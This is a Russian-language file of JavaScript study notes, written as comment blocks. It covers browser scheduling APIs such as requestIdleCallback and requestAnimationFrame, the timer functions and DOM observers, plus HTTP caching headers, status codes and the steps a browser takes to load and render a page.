			// ⁡⁣⁣⁢requestIdleCallback — это метод в браузерном API, предназначенный для планирования задач в периоды "простоя" браузера, когда основной поток не занят критически важными операциями (например, рендерингом, обработкой событий). Это помогает улучшить производительность, избегая блокировки основного потока. Рассмотрим подробно, как и когда его использовать.⁡
			// 🔳 ⁡⁣⁢⁢КАК РАБОТАЕТ requestIdleCallback?⁡
			{
				// 🔴 ⁡⁣⁣⁢Принцип работы: Браузер выполняет переданную функцию (колбэк) в момент, когда у него есть свободные ресурсы.⁡// 🔴 ⁡⁣⁣⁢Параметры колбэка⁡
				// ⚪ ⁡⁣⁣⁡⁢⁢⁢deadline: Объект с двумя свойствами⁡
				// ⚡ ⁡⁢⁣⁣timeRemaining(): Возвращает время (в миллисекундах), оставшееся до следующего кадра (обычно до 50 мс).⁡
				// ⚡ ⁡⁢⁣⁣didTimeout: true, если колбэк вызван из-за превышения заданного timeout.⁡
				// 🔴 ⁡⁣⁣⁢Опции⁡
				// ⚪ ⁡⁢⁢⁢timeout: Максимальное время ожидания перед вызовом колбэка, даже если нет простоя (например, { timeout: 2000 }).⁡
			}
			// 🔳 ⁡⁣⁢⁢КОГДА ИСПОЛЬЗОВАТЬ?⁡
			{
				// 🔴 ⁡⁣⁣⁢Фоновые задачи⁡
				// ⚪ ⁡⁢⁢⁢Логирование, аналитика.⁡
				// ⚪ ⁡⁢⁢⁢Предварительная загрузка данных/ресурсов.⁡
				// ⚪ ⁡⁢⁢⁢Кэширование, синхронизация.⁡
				// 🔴 ⁡⁣⁣⁢Тяжёлые вычисления⁡
				// ⚪ ⁡⁢⁢⁢Обработка больших массивов.⁡
				// ⚪ ⁡⁢⁢⁢Генерация контента (например, разметка для скроллинга).⁡
				// 🔴 ⁡⁣⁣⁢Постепенное обновление UI⁡
				// ⚪ ⁡⁢⁢⁢Поэлементный рендеринг списков.⁡
			}
			// 🔳 ⁡⁣⁢⁢ПРИМЕРЫ С КОММЕНТАРИЯМИ⁡
			{
				// 🔴 ⁡⁣⁣⁢Пример 1: Базовая задача⁡
				{
					function runTask(deadline) {
						// Проверяем, осталось ли время
						while (deadline.timeRemaining() > 0) {
							// Выполняем часть работы
							console.log("Выполняю фоновую задачу...");
						}

						// Если работа не завершена, планируем следующий этап
						requestIdleCallback(runTask);
					}
					// Запускаем задачу при простое
					requestIdleCallback(runTask);
				}
				// 🔴 ⁡⁣⁣⁢Пример 2: Обработка массива с проверкой времени⁡
				{
					const data = Array.from({ length: 1000 }, (_, i) => i);
					function processData(deadline, index = 0) {
						while (index < data.length && deadline.timeRemaining() > 0) {
							// Обрабатываем элемент
							console.log(`Обработан элемент ${data[index]}`);
							index++;
						}
						if (index < data.length) {
							// Продолжаем позже
							requestIdleCallback((deadline) => processData(deadline, index));
						} else {
							console.log("Все элементы обработаны!");
						}
					}
					requestIdleCallback((deadline) => processData(deadline, 0));
				}
				// 🔴 ⁡⁣⁣⁢Пример 3: Использование timeout⁡
				{
					const taskId = requestIdleCallback(
						(deadline) => {
							if (deadline.didTimeout) {
								console.log("Задача вызвана по таймауту!");
							}
							// ... выполняем задачу
						},
						{ timeout: 2000 }, // Максимум 2 секунды ожидания
					);
					// Отмена задачи (если не требуется)
					cancelIdleCallback(taskId);
				}
			}
			// 🔳 ⁡⁣⁢⁢ВАЖНЫЕ ЗАМЕЧАНИЯ⁡
			{
				// 🔴 ⁡⁣⁣⁢Не изменяйте DOM в колбэке: Это может вызвать неожиданные перерисовки. Для работы с DOM используйте requestAnimationFrame.⁡
				// 🔴 ⁡⁣⁣⁢Дробите задачи: Разбивайте тяжёлые операции на мелкие части, проверяя timeRemaining().⁡
				// 🔴 ⁡⁣⁣⁢Полифиллы: Для старых браузеров используйте полифиллы (например, react-scheduler).⁡
				// 🔴 ⁡⁣⁣⁢Приоритеты: Для более гибкого управления задачами в современных браузерах используйте Scheduling API (scheduler.postTask).⁡
			}
			// 🔳 ⁡⁣⁢⁢СОВЕТЫ⁡
			{
				// 🔴 ⁡⁣⁣⁢Измеряйте производительность: Используйте console.time() или performance.now(), чтобы убедиться, что задачи не превышают допустимое время.⁡
				// 🔴 ⁡⁣⁣⁢Комбинируйте с другими API: Например, выполняйте подготовку данных в requestIdleCallback, а рендеринг — в requestAnimationFrame.⁡
				{
					let preparedData = null;
					// Подготовка данных в фоне
					requestIdleCallback(() => {
						preparedData = prepareData(); // Тяжёлая операция
					});
					// Рендеринг в следующем кадре
					requestAnimationFrame(() => {
						if (preparedData) {
							renderUI(preparedData);
						}
					});
				}
			}
			// 🔳 ⁡⁣⁢⁢ИТОГ⁡
			{
				// 🔴 ⁡⁣⁣⁢requestIdleCallback — мощный инструмент для оптимизации, позволяющий выполнять задачи без ущерба для отзывчивости интерфейса. Используйте его для фоновых операций, дробите задачи и всегда проверяйте timeRemaining(). Для критически важных задач (анимации, ввод пользователя) выбирайте другие методы, такие как requestAnimationFrame.⁡
			}
		}
		// 🔵 ⁡⁣⁢⁢requestAnimationFrame()⁡
		{
			// ⁡⁣⁣⁢requestAnimationFrame (rAF) — это встроенный API браузера, предназначенный для оптимизации анимаций и других операций, связанных с перерисовкой (рендерингом) страницы. Он синхронизирует выполнение кода с частотой обновления экрана (обычно 60 FPS), что делает анимации плавными и снижает нагрузку на CPU/GPU.⁡
			// 🔳 ⁡⁣⁢⁢КАК РАБОТАЕТ REQUESTANIMATIONFRAME?⁡
			{
				// 🔴 ⁡⁣⁣⁢Автоматическая синхронизация: Браузер вызывает переданную функцию перед каждой перерисовкой экрана (≈16.7 мс при 60 FPS).⁡
				// 🔴 ⁡⁣⁣⁢Эффективность: Если вкладка неактивна, анимация автоматически приостанавливается, экономя ресурсы.⁡
				// 🔴 ⁡⁣⁣⁢Отмена анимации: Через cancelAnimationFrame(id).⁡
				{
					// синтаксис
					let animationId;
					function animate(timestamp) {
						// timestamp — время с начала загрузки страницы
						// Логика анимации
						console.log(`Текущее время: ${timestamp} мс`);
						// Запускаем следующий кадр
						animationId = requestAnimationFrame(animate);
					}
					// Старт анимации
					animationId = requestAnimationFrame(animate);
					// Остановка (например, по клику)
					button.addEventListener("click", () => {
						cancelAnimationFrame(animationId);
					});
				}
			}
			// 🔳 ⁡⁣⁢⁢КОГДА ИСПОЛЬЗОВАТЬ REQUESTANIMATIONFRAME?⁡
			{
				// 🔴 ⁡⁣⁣⁢Анимации (движение, fade-in/out, скролл).⁡
				// 🔴 ⁡⁣⁣⁢Плавные переходы (изменение размеров, цвета).⁡
				// 🔴 ⁡⁣⁣⁢Сложные визуальные эффекты (частицы, канвас).⁡
			}
			// 🔳 ⁡⁣⁢⁢ПРИМЕРЫ С КОММЕНТАРИЯМИ⁡
			{
				// 🔴 ⁡⁣⁣⁢1. Простая анимация (движение блока)⁡
				{
					<div
						id="box"
						style="width:50px; height:50px; background:red; position:absolute;"
					></div>;
					const box = document.getElementById("box");
					let posX = 0;
					function moveBox(timestamp) {
						posX += 2; // Смещение на 2px за кадр
						box.style.left = posX + "px";
						if (posX < 300) {
							// Останавливаемся на 300px
							requestAnimationFrame(moveBox);
						}
					}
					requestAnimationFrame(moveBox);
				}
				// 🔴 ⁡⁣⁣⁢2. Плавное изменение прозрачности (fade-in)⁡
				{
					const element = document.getElementById("fade-element");
					let opacity = 0;
					function fadeIn() {
						opacity += 0.01;
						element.style.opacity = opacity;
						if (opacity < 1) {
							requestAnimationFrame(fadeIn);
						}
					}
					fadeIn();
				}
				// 🔴 ⁡⁣⁣⁢3. Анимация на <canvas> (крутящийся квадрат)⁡
				{
					<canvas id="canvas" width="200" height="200"></canvas>;
					const canvas = document.getElementById("canvas");
					const ctx = canvas.getContext("2d");
					let angle = 0;
					function rotateSquare() {
						ctx.clearRect(0, 0, canvas.width, canvas.height); // Очищаем канвас
						ctx.save();
						ctx.translate(100, 100); // Центр
						ctx.rotate(angle); // Поворот
						ctx.fillStyle = "blue";
						ctx.fillRect(-25, -25, 50, 50); // Квадрат 50x50
						ctx.restore();
						angle += 0.02; // Увеличиваем угол
						requestAnimationFrame(rotateSquare);
					}
					rotateSquare();
				}
				// 🔴 ⁡⁣⁣⁢4. Контроль FPS (ограничение до 30 кадров/сек)⁡
				{
					let lastTime = 0;
					const fps = 30;
					const frameDelay = 1000 / fps;
					function animateLimited(time) {
						if (time - lastTime >= frameDelay) {
							// Ваш код анимации (выполняется 30 раз/сек)
							console.log("Кадр:", time);
							lastTime = time;
						}
						requestAnimationFrame(animateLimited);
					}
					animateLimited();
				}
			}
			// 🔳 ⁡⁣⁢⁢ЧЕМ ОТЛИЧАЕТСЯ ОТ SETINTERVAL/SETTIMEOUT?⁡
			{
				// ⁡⁣⁣⁢КРИТЕРИЙ	            REQUESTANIMATIONFRAME	        SETINTERVAL/SETTIMEOUT⁡
				// ⁡⁢⁣⁣Синхронизация        С кадровой частотой (60 FPS)    Фиксированный интервал (может пропускать кадры)⁡
				// ⁡⁢⁣⁣Производительность   Оптимизирован браузером         Может вызывать лаги и лишние перерисовки⁡
				// ⁡⁢⁣⁣Энергопотребление    Приостанавливается в неактивных Работает в фоне (тратит заряд батареи)⁡
				//                      ⁡⁢⁣⁣вкладках⁡
			}
			// 🔳 ⁡⁣⁢⁢СОВЕТЫ И ЛУЧШИЕ ПРАКТИКИ⁡
			{
				// 🔴 ⁡⁣⁣⁢Всегда очищайте анимацию через cancelAnimationFrame⁡
				{
					let animId;
					function start() {
						animId = requestAnimationFrame(animate);
					}
					function stop() {
						cancelAnimationFrame(animId);
					}
				}
				// 🔴 ⁡⁣⁣⁢Избегайте лишних вычислений внутри rAF. Оптимизируйте код.⁡
				// 🔴 ⁡⁣⁣⁢Для сложных сцен используйте WebGL (Three.js) или CSS-анимации.⁡
				// 🔴 ⁡⁣⁣⁢Комбинируйте с requestIdleCallback для фоновых задач.⁡
			}
			// 🔳 ⁡⁣⁢⁢ИТОГ⁡
			{
				// ⁡⁣⁣⁢requestAnimationFrame — лучший выбор для анимаций и визуальных эффектов в браузере. Он обеспечивает:⁡
				// ✅ ⁡⁢⁢⁢Плавность (синхронизация с дисплеем).⁡
				// ✅ ⁡⁢⁢⁢Эффективность (не грузит CPU в фоне).⁡
				// ✅ ⁡⁢⁢⁢Автоматическую оптимизацию (браузер сам управляет вызовами).⁡
				// ⁡⁣⁣⁢Используйте его вместо setInterval/setTimeout для любых операций, связанных с отрисовкой!⁡
			}
		}
		// 🔵 ⁡⁣⁢⁡⁣⁢⁢setTimeout() - выполнится через N время⁡
		{
			const timerId = setTimeout(() => {
				console.log("Это сообщение появится один раз через 2 секунды");
			}, 2000);
			// Отмена таймера (если нужно)
			// clearTimeout(timerId);
			// Сценарий использования
			{
				// задержка перед действием (например, всплывающее сообщение через 3 с);
				// отложенный старт рекурсивного процесса;
				// имитация «одноразового таймера».
			}
		}
		// 🔵 ⁡⁣⁢⁢setInterval() - будет выполняться через N время⁡
		{
			let counter = 0;
			const intervalId = setInterval(() => {
				counter++;
				console.log(`Прошло ${counter} секунд`);
				if (counter >= 5) {
					clearInterval(intervalId); // Остановка через 5 итераций
				}
			}, 1000);
			// Сценарий использования
			{
				// регулярные обновления (часы, счётчики);
				// периодический опрос сервера;
				// анимация с фиксированным интервалом.
			}
		}
		// 🔵 ⁡⁣⁢⁡⁣⁢⁢queueMicrotask() - Добавление задач в очередь микротасков.⁡
		{
			// ✅ ⁡⁢⁢⁢Выполняется после текущего синхронного кода, до рендеринга⁡
			// ✅ ⁡⁢⁢⁢Аналог Promise.resolve().then()⁡
			{
				queueMicrotask(() => {
					console.log("Микротаск выполнен");
				});
			}
		}
		// 🔵 ⁡⁣⁢⁢performance.now() - Высокоточное измерение времени (до микросекунд).⁡
		{
			// ✅ ⁡⁢⁢⁢Монотонное время (не зависит от системных часов)⁡
			// ✅ ⁡⁢⁢⁢Используется для бенчмаркинга⁡
			{
				const start = performance.now();
				// Код...
				const duration = performance.now() - start;
			}
		}
		// 🔵 ⁡⁣⁢⁢new MutationObserver(collbak) - Отслеживание изменений в DOM⁡
		{
			// ✅ ⁡⁢⁢⁢Замена устаревшего MutationEvents⁡
			// ✅ ⁡⁢⁢⁢Асинхронный батчинг изменений⁡
			{
				const observer = new MutationObserver((mutations) => {
					mutations.forEach((m) => console.log("DOM изменился:", m));
				});
				observer.observe(element, { attributes: true, childList: true });
			}
		}
		// 🔵 ⁡⁣⁢⁢new ResizeObserver(collback) - Отслеживание изменений размеров элементов.⁡
		{
			const ro = new ResizeObserver((entries) => {
				for (let entry of entries) {
					console.log("Новый размер:", entry.contentRect);
				}
			});
			ro.observe(element);
		}
		// 🔵 ⁡⁣⁢⁢new IntersectionObserver(collback) - Отслеживание видимости элементов в viewport.⁡
		{
			const io = new IntersectionObserver((entries) => {
				entries.forEach((entry) => {
					if (entry.isIntersecting) {
						console.log("Элемент в зоне видимости");
					}
				});
			});
			io.observe(element);
		}
	}
	// 🔸 ⁡⁢⁣⁣СВОЙСТВА (__proto__)⁡
	{
		// 🔵 ⁡⁣⁢⁢Свойство __proto__ — это свойство, которое существует у каждого объекта в JavaScript. Оно содержит ссылку на объект-прототип, который используется как резервный источник свойств и методов, если исходный объект ими не обладает.⁡
	}
}
// ⁡⁢⁣⁢ПОРЯДОК РАБОТЫ БРАУЗЕРА⁡
{
    // ⁡⁣⁢⁣ЗАПРОС И ПОЛУЧЕНИЕ ОТВЕТА В ВИДЕ HTML⁡
    {
        // ⁡⁢⁣⁣1. ВВОД URL И ПАРСИНГ(ПАРСИТ)⁡
        {
            // ⁡⁣⁣⁢🔳 ⁡⁣⁣⁢Пользователь вводит URL или по ссылке (например, https://example.com).⁡
            // ⁡⁣⁣⁢🔳 Браузер анализирует URL:⁡
            // ⁡⁢⁢✅⁢ ⁡⁢⁢⁢Протокол (HTTP/HTTPS) — определяет метод связи с сервером.⁡
            // ⁢✅ ⁡⁢⁢⁢Доменное имя (example.com) — адрес сервера.⁡
            // ✅ ⁡⁢⁢⁢Путь (например, /page.html) — запрашиваемый ресурс.⁡
            // ⁡⁣⁣⁢🔳 Если введён неполный URL (например, example.com), браузер автоматически добавит https:// и /.⁡
        }
        // ⁡⁢⁣⁣2. ПРОВЕРКА КЭША, НАСТРОЙКА⁡
        {
			// 🔳 ⁡⁣⁣⁢Браузер проверяет свой кэш на наличие ранее загруженных ресурсов (HTML, CSS, JS, изображения).⁡
			// 🔳 ⁡⁣⁣⁢Если ресурс есть в кэше и не устарел (на основе заголовков Cache-Control), он используется без запроса к серверу.⁡
			// 🔳 ⁡⁣⁣⁢ОСНОВНЫЕ HTTP-ЗАГОЛОВКИ ДЛЯ КЕШИРОВАНИЯ⁡
			{
				// ⭐ ⁡⁣⁣⁢Cache-Control – основной заголовок, управляющий кешированием.⁡
				// ⭐ ⁡⁣⁣⁢Expires – устаревший, но поддерживаемый способ указать срок жизни кеша.⁡
				// ⭐ ⁡⁣⁣⁢ETag и Last-Modified – для валидации кеша (проверки изменений).⁡
				// 🔹 ⁡⁣⁢⁢Cache-Control: основные директивы⁡
				{
					// Cache-Control: directive1, directive2, ...
					// ⁡⁢⁣⁣ДИРЕКТИВА		ОПИСАНИЕ									ПРИМЕР⁡
					// ⁡⁣⁣⁢max-age=N		Кешировать на N секунд						max-age=3600 (1 час)⁡
					// ⁡⁣⁣⁢no-cache			Кешировать, но проверять свежесть			no-cache⁡
					// ⁡⁣⁣⁢no-store			Не кешировать вообще						no-store⁡
					// ⁡⁣⁣⁢public			Можно кешировать (даже через прокси)		public, max-age=86400⁡
					// ⁡⁣⁣⁢private	Т		олько для браузера (не для прокси)			private, max-age=600⁡
					// ⁡⁣⁣⁢must-revalidate	Обязательная проверка кеша					must-revalidate⁡
					// ⁡⁣⁣⁢immutable		Контент не меняется (оптимизация)			immutable, max-age=31536000⁡
					// ✅ ⁡⁢⁢⁢Статические файлы (CSS, JS, изображения) – долгий кеш⁡
					// ⚪ ⁡⁣⁣⁢Cache-Control: public, max-age=31536000, immutable⁡
					// ✅ ⁡⁢⁢⁢Динамические данные (API, HTML) – короткий кеш или валидация⁡
					// ⚪ ⁡⁣⁣⁢Cache-Control: no-cache или Cache-Control: max-age=60, must-revalidate (кеш на 1 минуту, но с проверкой свежести)⁡
					// ✅ ⁡⁢⁢⁢Конфиденциальные данные – запрет кеширования⁡
					// ⚪ ⁡⁣⁣⁢Cache-Control: no-store⁡
				}
				// 🔹 ⁡⁣⁢⁢Expires (устаревший, но поддерживается)⁡
				{
					// ✅ ⁡⁢⁢⁢Указывает точную дату истечения кеша:⁡
					// ⚪ ⁡⁣⁣⁢Expires: Wed, 21 May 2025 07:00:00 GMT⁡
					// ⚡ ⁡⁢⁣⁣Лучше использовать Cache-Control: max-age, т.к. Expires зависит от времени на клиенте.⁡
				}
				// 🔹 ⁡⁣⁢⁢Валидация кеша (ETag / Last-Modified)⁡
				{
					// ✅ ⁡⁢⁢⁢Если кеш устарел, браузер может проверить, изменился ли ресурс:⁡
					// ⚪ ⁡⁣⁣⁢ETag – хеш содержимого (например, ETag: "a1b2c3").⁡
					// ⚪ ⁡⁣⁣⁢Last-Modified – дата последнего изменения.⁡
					// ✅
					// ✅
				}
				// 🔹 ⁡⁣⁢⁢Браузер отправляет:⁡
				{
					// ⚪ ⁡⁣⁣⁢If-None-Match: "a1b2c3" (если есть ETag).⁡
					// ⚪ ⁡⁣⁣⁢If-Modified-Since: <дата> (если есть Last-Modified).⁡
				}
				// 🔹 ⁡⁣⁢⁢Сервер отвечает:⁡
				{
					// ⚪ ⁡⁣⁣⁢304 Not Modified – если контент не изменился (кеш актуален).⁡
					// ⚪ ⁡⁣⁣⁢200 OK + новые данные – если контент изменился.⁡
				}
			}
			// 🔳 ⁡⁣⁣⁢ПРИМЕРЫ НАСТРОЙКИ НА СЕРВЕРЕ⁡
			{
				// 🔹 ⁡⁣⁢⁢Nginx⁡
				{
					{
						// location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
						// expires 365d;
						// add_header Cache-Control "public, max-age=31536000, immutable";
					}

					location /
						{
							// add_header Cache-Control "no-cache";
						};
				}
				// 🔹 ⁡⁣⁢⁢Apache (.htaccess)⁡
				{
					// <FilesMatch "\.(jpg|jpeg|png|gif|css|js)$">
					// 	Header set Cache-Control "public, max-age=31536000, immutable"
					// </FilesMatch>
					// <FilesMatch "\.(html|php)$">
					// 	Header set Cache-Control "no-cache"
					// </FilesMatch>
				}
				// 🔹 ⁡⁣⁢⁢Node.js (Express)⁡
				{
					app.use(
						express.static("public", {
							maxAge: "1y",
							immutable: true,
							setHeaders: (res, path) => {
								if (path.endsWith(".html")) {
									res.set("Cache-Control", "no-cache");
								}
							},
						}),
					);
				}
			}
			// 🔳 ⁡⁣⁣⁢КАК ПРОВЕРИТЬ КЕШИРОВАНИЕ?⁡
			{
				// ✅ ⁡⁣⁣⁡⁢⁢⁢DevTools → Вкладка Network (столбец Size покажет (disk cache)).⁡
				// ✅ ⁡⁢⁢⁢Проверить заголовки ответа (Cache-Control, ETag).⁡
				// ✅ ⁡⁢⁢⁢curl curl -I http://example.com/style.css⁡
			}
			// 🔳 ⁡⁣⁣⁢ВЫВОД⁡
			{
				// ✅ ⁡⁢⁢⁢Статика (CSS, JS, изображения) → Cache-Control: max-age=31536000, immutable.⁡
				// ✅ ⁡⁢⁢⁢HTML, API → Cache-Control: no-cache или max-age=60, must-revalidate.⁡
				// ✅ ⁡⁢⁢⁢Конфиденциальные данные → Cache-Control: no-store.⁡
			}
		}
        // ⁡⁢⁣⁡⁢⁣⁣3. DNS-ЗАПРОС (DOMAIN NAME SYSTEM)⁡
        {
            // 🔳 ⁡⁣⁣⁢Если доменное имя не закэшировано, браузер выполняет DNS-поиск для преобразования домена в IP-адрес:⁡
            // ✅ ⁡⁢⁢⁢Проверяет локальный DNS-кэш (в браузере и ОС).⁡
            // ✅ ⁡⁢⁢⁢Если не найдено, отправляет запрос к DNS-серверу провайдера (или публичным DNS, например, Google DNS).⁡
            // ✅ ⁡⁢⁢⁢DNS-сервер возвращает IP-адрес (например, 93.184.216.34 для example.com).⁡
        }
        // ⁡⁢⁣⁣4. УСТАНОВКА СОЕДИНЕНИЯ (TCP И TLS)⁡
        {
            // 🔳 ⁡⁣⁣⁢Браузер устанавливает TCP-соединение с сервером через «трёхэтапное рукопожатие» (SYN, SYN-ACK, ACK).⁡
            // 🔳 ⁡⁣⁣⁢Для HTTPS:⁡
            // ✅ ⁡⁢⁢⁢Происходит TLS-рукопожатие для шифрования данных:⁡
            // 🔹 ⁡⁣⁢⁢Сервер отправляет SSL-сертификат.⁡
            // 🔹 ⁡⁣⁢⁢Проверка сертификата (срок действия, доверенный центр сертификации).⁡
            // 🔹 ⁡⁣⁢⁢Создание сессионных ключей для шифрования.⁡
        }
        // ⁡⁢⁣⁣5. ОТПРАВКА HTTP-ЗАПРОСА⁡
        {
            // 🔳 ⁡⁣⁣⁢Браузер отправляет HTTP-запрос (обычно GET или POST) на сервер:⁡
            {
                // GET /page.html HTTP/1.1
                // Host: example.com
                // User-Agent: Mozilla/5.0...
                // Accept: text/html,
            }
            // 🔳 ⁡⁣⁣⁢Заголовки (Headers) могут включать cookies, язык, тип данных и т.д.⁡
        }
        // ⁡⁢⁣⁣6. ОБРАБОТКА ЗАПРОСА СЕРВЕРОМ⁡
        {
            // 🔳 ⁡⁣⁣⁢Сервер (например, Apache, Nginx) обрабатывает запрос:⁡
            // ✅ ⁡⁢⁢⁢Веб-сервер направляет запрос к нужному приложению (например, PHP, Node.js).⁡
            // ✅ ⁡⁢⁢⁢Бэкенд-приложение генерирует ответ (запросы к БД, API и т.д.).⁡
            // ✅ ⁡⁢⁢⁢Формируется HTTP-ответ с кодом статуса (200 OK, 404 Not Found и др.), заголовками и телом (например, HTML).⁡
        }
        // ⁡⁢⁣⁣7. ПОЛУЧЕНИЕ ОТВЕТА⁡
        {
			// 🔳 ⁡⁣⁣⁢Браузер получает ответ от сервера:⁡
			// ✅ ⁡⁢⁢⁢Код статуса (например, 200 OK, 301 Moved Permanently, 404 Not Found).⁡
			// ✅ ⁡⁢⁢⁢Заголовки (Content-Type, Cache-Control, Set-Cookie и др.).⁡
			// ✅ ⁡⁢⁢⁢Тело ответа (HTML, CSS, JS, изображения и т.д.).⁡
			// 🔳 ⁡⁣⁣⁢Если ответ — редирект (например, 301), браузер повторяет процесс для нового URL.⁡
			// 🔳 ⁡⁣⁣⁢Коды состояния HTTP (Status Codes) — это трехзначные числа, которые сервер отправляет в ответ на клиентский запрос. Они указывают на результат обработки запроса и помогают понять, что произошло с запросом.⁡
			{
				// 🔹 ⁡⁣⁢⁢КЛАССЫ КОДОВ СОСТОЯНИЯ⁡
				{
					// ⁡⁣⁣⁢Коды делятся на 5 классов (по первой цифре):⁡
					// ✅ ⁡⁢⁢⁢1xx (Информационные) – запрос принят, обработка продолжается.⁡
					{
						// ⚡ ⁡⁢⁣⁣100 Continue – сервер готов принять тело запроса.⁡
						// ⚡ ⁡⁢⁣⁣101 Switching Protocols – сервер согласен сменить протокол (например, на WebSocket).⁡
						// ⚡ ⁡⁢⁣⁣102 Processing – запрос в обработке (используется в WebDAV).⁡
					}
					// ✅ ⁡⁢⁢⁢2xx (Успешные) – запрос успешно обработан.⁡
					{
						// ⚡ ⁡⁢⁣⁣200 OK – стандартный успешный ответ.⁡
						// ⚡ ⁡⁢⁣⁣201 Created – ресурс создан (после POST/PUT).⁡
						// ⚡ ⁡⁢⁣⁣202 Accepted – запрос принят, но ещё не обработан.⁡
						// ⚡ ⁡⁢⁣⁣204 No Content – ответ без тела (например, после DELETE).⁡
						// ⚡ ⁡⁢⁣⁣206 Partial Content – сервер отправил часть данных (используется при докачке файлов).⁡
					}
					// ✅ ⁡⁢⁢⁢3xx (Перенаправления) – требуется дополнительное действие.⁡
					{
						// ⚡ ⁡⁢⁣⁣301 Moved Permanently – ресурс перемещён навсегда.⁡
						// ⚡ ⁡⁢⁣⁣302 Found (Moved Temporarily) – временное перенаправление.⁡
						// ⚡ ⁡⁢⁣⁣304 Not Modified – контент не изменился (кеш актуален).⁡
						// ⚡ ⁡⁢⁣⁣307 Temporary Redirect – временный редирект с сохранением метода.⁡
						// ⚡ ⁡⁢⁣⁣308 Permanent Redirect – постоянный редирект с сохранением метода.⁡
					}
					// ✅ ⁡⁢⁢⁢4xx (Ошибки клиента) – запрос содержит ошибку.⁡
					{
						// ⚡ ⁡⁢⁣⁣400 Bad Request – некорректный запрос (синтаксическая ошибка).⁡
						// ⚡ ⁡⁢⁣⁣401 Unauthorized – требуется аутентификация.⁡
						// ⚡ ⁡⁢⁣⁣403 Forbidden – доступ запрещён (нет прав).⁡
						// ⚡ ⁡⁢⁣⁣404 Not Found – ресурс не найден.⁡
						// ⚡ ⁡⁢⁣⁣405 Method Not Allowed – метод не поддерживается.⁡
						// ⚡ ⁡⁢⁣⁣408 Request Timeout – сервер ждал запрос слишком долго.⁡
						// ⚡ ⁡⁢⁣⁣429 Too Many Requests – превышен лимит запросов.⁡
					}
					// ✅ ⁡⁢⁢⁢5xx (Ошибки сервера) – сервер не смог обработать запрос.⁡
					{
						// ⚡ ⁡⁢⁣⁣500 Internal Server Error – общая ошибка сервера.⁡
						// ⚡ ⁡⁢⁣⁣502 Bad Gateway – прокси-сервер получил недопустимый ответ.⁡
						// ⚡ ⁡⁢⁣⁣503 Service Unavailable – сервер временно недоступен.⁡
						// ⚡ ⁡⁢⁣⁣504 Gateway Timeout – прокси-сервер не дождался ответа.⁡
						// ⚡ ⁡⁢⁣⁣505 HTTP Version Not Supported – версия HTTP не поддерживается.⁡
					}
				}
				// 🔹 ⁡⁣⁢⁢КАК ИСПОЛЬЗОВАТЬ?⁡
				{
					// ✅ ⁡⁢⁢⁢200-299 – всё хорошо, можно обрабатывать ответ.⁡
					// ✅ ⁡⁢⁢⁢300-399 – проверить редиректы (Location в заголовках).⁡
					// ✅ ⁡⁢⁢⁢400-499 – исправить запрос (проверить URL, авторизацию, данные).⁡
					// ✅ ⁡⁢⁢⁢500-599 – проблема на стороне сервера, можно повторить запрос позже.⁡
				}
			}
		}
    }
    // ⁡⁣⁢⁣РЕНДЕРИНГ СТРАНИЦЫ⁡
    {
		// ⁡⁢⁣⁣8. РЕНДЕРИНГ СТРАНИЦЫ HTML⁡
		{
			// 🔳 ⁡⁣⁣⁢Браузер обрабатывает полученные данные и отображает страницу:⁡
			// ✅ ⁡⁢⁢⁢Парсинг HTML⁡
			// 🔹 ⁡⁣⁢⁢ПОСТРОЕНИЕ DOM-ДЕРЕВА (DOCUMENT OBJECT MODEL) ИЗ HTML-ТЕГОВ:⁡
			// 🔸 ⁡⁢⁣⁣Браузер читает HTML последовательно.⁡
			// 🔸 ⁡⁢⁣⁣При встрече тега <link> или <style> он начинает загрузку и обработку CSS⁡
			{
				// ⚪ ⁡⁣⁣⁢Каждый <link href="styles.css"> запускает HTTP-запрос. Браузер блокирует рендеринг до загрузки и парсинга CSS (если нет атрибутов media, исключающих текущие условия⁡
				// ⚪ ⁡⁣⁣⁢Обработка встроенных стилей (<style>) и инлайновых стилей (style="...") - Эти стили применяются мгновенно, без ожидания загрузки внешних ресурсов⁡
				// ⚪ ⁡⁣⁣⁢Исключения - Если у <link> указан media, который не соответствует текущему устройству (например, media="print"), браузер загрузит файл асинхронно, не блокируя рендеринг⁡
				{
					// ⁡⁢⁢⁢Загружается, но не блокирует рендеринг⁡
					// <link rel="stylesheet" href="print.css" media="print">
					// ⁡⁢⁢⁢Предзагрузка CSS⁡
					// <link rel="preload" href="styles.css" as="style"></link>
				}
			}
			// 🔸 ⁡⁢⁣⁡⁢⁣⁣При встрече тегов <script> (без async/defer) парсинг приостанавливается для загрузки и выполнения JS.⁡
			{
				// ⚪ ⁡⁣⁣⁢Возможны повторные этапы рендеринга (например, при изменении DOM).⁡
				// ⚪ ⁡⁣⁣⁢Атрибуты async и defer - Эти атрибуты меняют поведение загрузки скриптов:⁡
				// ⚡ ⁡⁢⁣⁣async (асинхронная загрузка)⁡ <script async src="script.js"></script>
				{
					// 🔵 ⁡⁣⁢⁢Загрузка: Параллельно с парсингом HTML.⁡
					// 🔵 ⁡⁣⁢⁢Выполнение: Как только скрипт загрузится (может прервать парсинг HTML).⁡
					// 🔵 ⁡⁣⁢⁢Порядок: Не гарантирован (первый загруженный — первый выполненный).⁡
					// 🔵 ⁡⁣⁢⁢Используйте для: Скриптов, не зависящих от DOM или других скриптов (например, аналитика).⁡
				}
				// ⚡ ⁡⁢⁣⁣defer (отложенное выполнение)⁡ <script defer="defer" src="script.js"></script>
				{
					// 🔵 ⁡⁣⁢⁢Загрузка: Параллельно с парсингом HTML.⁡
					// 🔵 ⁡⁣⁢⁢Выполнение: После полного парсинга HTML, перед событием DOMContentLoaded.⁡
					// 🔵 ⁡⁣⁢⁢Порядок: Сохраняется (скрипты выполняются в порядке их объявления в HTML).⁡
				}
				// ⚪ ⁡⁣⁣⁢Динамически добавляемые скрипты⁡ ⁡⁣⁣⁢- Скрипты, созданные через JavaScript, ведут себя как async по умолчанию⁡
				{
					const script = document.createElement("script");
					script.src = "script.js";
					document.head.appendChild(script); // Загружается и выполняется асинхронно
				}
				// ⚪ ⁡⁣⁣⁢Чтобы сохранить порядок выполнения, установите async: false⁡
				{
					script.async = false; // Теперь поведение как у `defer`
				}
				// ⚪ ⁡⁣⁣⁢Влияние на события⁡
				// ⚡ ⁡⁢⁣⁣DOMContentLoaded⁡
				// 🔹 ⁡⁣⁢⁢Срабатывает после парсинга HTML и выполнения всех синхронных скриптов и скриптов с defer.⁡
				// 🔹 ⁡⁣⁢⁢Не ждёт скриптов с async.⁡
				// ⚡ ⁡⁢⁣⁣load⁡
				// 🔹 ⁡⁣⁢⁢Срабатывает после загрузки всех ресурсов (изображений, стилей, скриптов).⁡
			}
